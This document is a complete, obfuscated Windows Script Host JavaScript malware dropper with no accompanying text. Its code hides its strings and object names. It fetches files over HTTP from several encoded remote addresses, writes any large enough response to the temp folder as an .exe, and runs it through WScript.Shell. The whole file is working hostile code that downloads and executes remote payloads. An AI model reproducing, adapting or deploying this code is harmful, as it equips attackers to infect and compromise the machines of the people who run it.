
function VBzf(vGCLV) {
return WScript.CreateObject(vGCLV);
}
function lzlF(LcduA,DLlrv) {
LcduA.write(DLlrv);
}
function Jrxe(jrXsA) {
jrXsA.open();
}
function dBSN(EjxwO,mbLeu) {
var Jurjldf=["\x73\x61\x76\x65\x54\x6F\x46\x69\x6C\x65"];EjxwO[Jurjldf[289-289]](mbLeu,447-445);
}
function zarg(FKcZq,mXVHJ,dhKSZ) {
FKcZq.open(dhKSZ,mXVHJ,false);
}
function ViRu(gebjc) {
if (gebjc == 794-594){return true;} else {return false;}
}
function mRqV(SQQfk) {
if (SQQfk > 164575-410){return true;} else {return false;}
}
function ffln(tYoyF) {
var AcRtn="";
J=(713-713);
do {
if (J >= tYoyF.length) {break;}
if (J % (578-576) != (759-759)) {
AcRtn += tYoyF.substring(J, J+(940-939));
}
J++;
} while(true);
return AcRtn;
}
function PPRj(MDqbp) {
var MLhsrRvZ=["\x73\x65"+"\x6E\x64"];
MDqbp[MLhsrRvZ[0]]();
}
function/*WHmk*/HLITeDeg(inWWP,zhCUTx) {
var gZYyDl= "\x72 \x75";
var pnjVb=(gZYyDl+" \x6E").split(" ");
var ZOy=pnjVb[702-702]+pnjVb[155-154]+pnjVb[658-656];
var SCxs=/*ijrV*/[ZOy];
//VExB
inWWP[SCxs[747-747]](zhCUTx);
}
function rDOU(CqlfE) {
return CqlfE.status;
}
function wAlvp(oRdQmJ) {
return new ActiveXObject(oRdQmJ);
}
function ztUVCML(qTMn,FKMTN) {
return qTMn.ExpandEnvironmentStrings(FKMTN);
}



function CTdfmYpJs(DpIOvkQtRsu) {
var JaCRgSBz = iFXNv("uuox@Ws@FqzoMXs@c@ZyWjUE@ri"+"@pt@VUOLANkG@.S@Vvdrc@he@zENrKu@ll@dqSinwQ@DqpzFsNj@wjZs", "@");
var JHVsHqUo = VBzf(JaCRgSBz[287-286] + JaCRgSBz[511-508] + JaCRgSBz[112-107] + JaCRgSBz[249-243] + JaCRgSBz[542-534] + JaCRgSBz[214-204]+JaCRgSBz[283-271]);
HLITeDeg(JHVsHqUo,DpIOvkQtRsu);
}





function vrQASsn(RiMT) {
var TemNIR=["\x72\x65\x73\x70\x6F\x6E\x73\x65\x42\x6F\x64\x79"];
return RiMT[TemNIR[0]];
}
function DkCgVjvA(ATG) {
return ATG.size;
}
function NhnRt(fkHZWG) {
return fkHZWG.position=542-542;
}
function iFXNv(EkO,RuOFC) {
return EkO.split(RuOFC);
}
function LtHcZEeBA(QDRno) {
var uEolE = iFXNv("KJhYVe^ucF^pt.Shell^iXrnVYl^Scri^xNmO^%TE^MP%^\\^gTKuscxEs^KCaidQ^eDwUTMu^ZdoYu", "^");
var IYg=((871-870)?"W" + uEolE[444-440]:"")+uEolE[150-148];
var mp = VBzf(IYg);
return ztUVCML(mp,uEolE[874-868]+uEolE[359-352]+uEolE[488-480]);
}
function AUylgGcA(JSYi) {
var BjqiRRovYW = "Sc BnngbRs r SdjFMFlTq ipting OMisJLS bsV ile WsfEbwFUqCOKpe";
var BpqBFwV = iFXNv(BjqiRRovYW+" "+"System fn MdwPl Obj mxidHv ect LcDgJtP JTCZZ", " ");
return BpqBFwV[0] + BpqBFwV[2] + BpqBFwV[4] + ".F" + BpqBFwV[7] + BpqBFwV[9] + BpqBFwV[12] + BpqBFwV[14];
}

var PX="I?v Vgvr6a7nRdgmwayhZecrcekqiqE.RcroymS/U7m0TcrFLOMvI?t QgXrTa5nWdIaXaPrreEyTodu2c8cX.xaOskilaf/5700ec7FIO6vs?p 5gWoSowg7lWeL.rcso8mc/K7W09cdFlO4vA?t 3?";
var eJ = ffln(PX).split(" ");
var gLaWwO = ". xSetlj e zoFuuQox xe cFOv".split(" ");
var w = [eJ[0].replace(new RegExp(gLaWwO[5],'g'), gLaWwO[0]+gLaWwO[2]+gLaWwO[4]),eJ[1].replace(new RegExp(gLaWwO[5],'g'), gLaWwO[0]+gLaWwO[2]+gLaWwO[4]),eJ[2].replace(new RegExp(gLaWwO[5],'g'), gLaWwO[0]+gLaWwO[2]+gLaWwO[4]),eJ[3].replace(new RegExp(gLaWwO[5],'g'), gLaWwO[0]+gLaWwO[2]+gLaWwO[4]),eJ[4].replace(new RegExp(gLaWwO[5],'g'), gLaWwO[0]+gLaWwO[2]+gLaWwO[4])];
var bmj = LtHcZEeBA("VLWW");
var KzD = wAlvp(AUylgGcA("nLgIY"));
var geEasO = ("LKncVEe \\").split(" ");
var EkUb = bmj+geEasO[0]+geEasO[1];
try{
KzD.CreateFolder(EkUb);
}catch(TEwCcl){
};
var zpv = ("2.XMLHTTP tqMxVpq TLfdP XML ream St JDAVpJjv AD mDBqQBd O kAXy D").split(" ");
var Zp = true  , xiJc = zpv[7] + zpv[9] + zpv[11];
var gZ = VBzf("MS"+zpv[3]+(178318, zpv[0]));
var Smj = VBzf(xiJc + "B." + zpv[5]+(240996, zpv[4]));
var pYM = 0;
var k = 1;
var YgDjlwg = 532373;
var m=pYM;
while (true)  {
if(m>=w.length) {break;}
var gN = 0;
var Szl = ("ht" + " EgGxNBy tp IWfBu XJhSTAGj :// FiaFRlT .e TzNhm x jrlPhj e G DuSzPUZ E DCjaFmDF T NWUU").split(" ");
try  {
var AxruQfg=Szl[886-881];
var ifdTC=Szl[673-673]+Szl[200-198]+AxruQfg;
zarg(gZ,ifdTC+w[m]+k, Szl[12]+Szl[14]+Szl[16]); PPRj(gZ); 
if (ViRu(rDOU(gZ)))  {      
Jrxe(Smj); Smj.type = 1; lzlF(Smj,vrQASsn(gZ)); if (mRqV(DkCgVjvA(Smj)))  {
gN = 1;NhnRt(Smj);dBSN(Smj,/*wlFG5499PY*/EkUb/*vDxi77bfGw*/+YgDjlwg+Szl[263-256]+Szl[388-379]+Szl[802-791]); try  {
if (417>48) {
CTdfmYpJs(EkUb+YgDjlwg+Szl[733-726]+Szl[778-769]+Szl[367-356]); 
break;
}
}
catch (ET)  {
}; 
}; Smj.close(); 
}; 
if (gN == 1)  {
pYM = m; break; 
}; 
}
catch (ET)  { 
}; 
m++;
}; 

